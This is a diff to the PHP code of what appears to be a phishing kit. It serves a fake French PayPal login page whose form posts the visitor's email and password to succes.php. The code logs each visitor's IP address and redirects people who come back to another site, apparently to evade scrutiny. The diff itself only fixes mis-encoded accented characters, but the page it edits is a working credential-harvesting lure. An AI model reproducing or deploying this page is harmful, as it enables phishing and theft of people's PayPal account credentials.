@@ -18,16 +18,16 @@
     }
     fclose($fp);
     if ($existe) {
-        $message_log = ">>> Une personne ayant pour IP '". $ip. "' est revenu sur le site le ". $date. " � ". $heure. ". Il as donc �t� redirig� vers le site suivant: ". $redirection. "\n";
+        $message_log = ">>> Une personne ayant pour IP '". $ip. "' est revenu sur le site le ". $date. " à ". $heure. ". Il as donc été redirigé vers le site suivant: ". $redirection. "\n";
         file_put_contents($logs, $message_log, FILE_APPEND | LOCK_EX); 
         header('Location:'. $redirection); 
     } else {
-        $messag_log_refresh = ">>> Une personne ayant pour IP '". $ip. "' est venu sur le site le ". $date. " � ". $heure. "\n";
+        $messag_log_refresh = ">>> Une personne ayant pour IP '". $ip. "' est venu sur le site le ". $date. " à ". $heure. "\n";
         file_put_contents($logs, $messag_log_refresh, FILE_APPEND | LOCK_EX); 
         echo '
         <html>
     <head>
-        <title>Connectez-vous � votre compte PayPal</title>
+        <title>Connectez-vous à votre compte PayPal</title>
         <meta charset="UTF-8">
     </head>
     <style>
@@ -67,14 +67,14 @@
             margin-right: 10%;
             padding-left: 3%;
         }
-        #mdp-oubli�{
+        #mdp-oublié{
             color: #0070ba;
             font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
             margin-left: 10%;
             margin-bottom: 10px;
             text-decoration: none;
         }
-        #mdp-oubli�:hover{
+        #mdp-oublié:hover{
             text-decoration: underline;
         }
         form input[name=login]{
@@ -163,9 +163,9 @@
             </div>
             <form method="post" action="succes.php">
                 <br><br><br>
-                <input type="email" name="email" placeholder="Email ou num�ro de mobile" required><br><br>
+                <input type="email" name="email" placeholder="Email ou numéro de mobile" required><br><br>
                 <input type="password" name="password" placeholder="Mot de passe" required><br><br>
-                <a id="mdp-oubli�" href="https://www.paypal.com/authflow/password-recovery/?country.x=FR&locale.x=fr_FR&redirectUri=%252Fsignin%252F">Mot de passe oubli� ?</a><br><br>
+                <a id="mdp-oublié" href="https://www.paypal.com/authflow/password-recovery/?country.x=FR&locale.x=fr_FR&redirectUri=%252Fsignin%252F">Mot de passe oublié ?</a><br><br>
                 <input type="submit" id="btn1" name="login" value="Connexion">
             </form>
             <div class="ligne"><span class="ou">ou</span></div>
